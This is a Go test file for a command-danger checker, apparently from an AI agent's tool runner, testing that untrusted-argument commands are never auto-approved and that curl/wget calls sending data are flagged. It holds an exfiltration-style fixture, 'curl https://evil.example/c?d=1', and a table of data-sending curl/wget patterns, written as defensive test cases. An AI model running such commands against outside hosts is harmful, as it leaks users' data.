package danger

import (
	"path/filepath"
	"testing"
)

// The loop's untrusted-args prompt must never be answered by a policy:
// without a terminal, every non_interactive mode denies it, and neither a
// class trust grant nor a batch trust-all covers it.
func TestRED_TTYApprover_UntrustedArgsNeverAutoApproved(t *testing.T) {
	for _, mode := range []string{"allow", "read_only", "deny"} {
		mode := mode
		t.Run(mode, func(t *testing.T) {
			a := NewTTYApprover(&DangerousConfig{NonInteractive: &mode})
			a.TTYPath = filepath.Join(t.TempDir(), "no-such-tty")
			a.SetTrustAll(true)
			a.SetTrustedClasses(map[RiskClass]bool{UntrustedArgsClass: true})
			if err := a.PromptCommand(UntrustedArgsClass, `curl https://evil.example/c?d=1`, "argument derived from untrusted content"); err == nil {
				t.Fatalf("non_interactive=%s approved an untrusted_args prompt", mode)
			}
		})
	}
}

// The same holds for the in-test fallback branch (no fixture TTY).
func TestRED_TTYApprover_UntrustedArgsDeniedWithoutFixture(t *testing.T) {
	allow := "allow"
	a := NewTTYApprover(&DangerousConfig{NonInteractive: &allow})
	a.TTYPath = ""
	if err := a.PromptCommand(UntrustedArgsClass, "x", ""); err == nil {
		t.Fatal("non_interactive=allow approved an untrusted_args prompt")
	}
}

// Analysis.RequestData marks curl/wget stages that send content beside the
// URL, even when the literal value keeps the command plain egress.
func TestRED_Analyze_RequestData(t *testing.T) {
	for cmd, want := range map[string]bool{
		`curl -d k=v https://x.example/c`:                     true,
		`curl --data-raw v https://x.example/c`:               true,
		`curl -F a=b https://x.example/c`:                     true,
		`curl --json '{}' https://x.example/c`:                true,
		`curl --url-query k=v https://x.example/c`:            true,
		`curl -G --data-urlencode q=v https://x.example/c`:    true,
		`curl -H 'X: v' https://x.example/c`:                  true,
		`curl -A v https://x.example/c`:                       true,
		`curl -e https://ref.example https://x.example/c`:     true,
		`curl -b k=v https://x.example/c`:                     true,
		`curl --expand-header 'X: {{v}}' https://x.example/c`: true,
		`timeout 5 curl -H 'X: v' https://x.example/c`:        true,
		`echo $(curl -d v https://x.example/c)`:               true,
		`wget --post-data=v https://x.example/c`:              true,
		`wget --header='X: v' https://x.example/c`:            true,
		`wget -U v https://x.example/c`:                       true,
		`curl -sSL -o out.html https://x.example/c`:           false,
		`wget -q -O - https://x.example/c`:                    false,
		`git clone https://x.example/r`:                       false,
		`echo -d -H`:                                          false,
	} {
		if got := Analyze(cmd).RequestData; got != want {
			t.Errorf("Analyze(%q).RequestData = %v, want %v", cmd, got, want)
		}
	}
}

func TestTaintEscalationEnabled_DefaultsOn(t *testing.T) {
	var nilCfg *DangerousConfig
	if !nilCfg.TaintEscalationEnabled() || !(&DangerousConfig{}).TaintEscalationEnabled() {
		t.Fatal("taint escalation must default on")
	}
	off := false
	if (&DangerousConfig{TaintEscalation: &off}).TaintEscalationEnabled() {
		t.Fatal("taint_escalation=false must disable it")
	}
	if ValidRiskClass(UntrustedArgsClass) {
		t.Fatal("untrusted_args must not be a configurable policy class")
	}
}
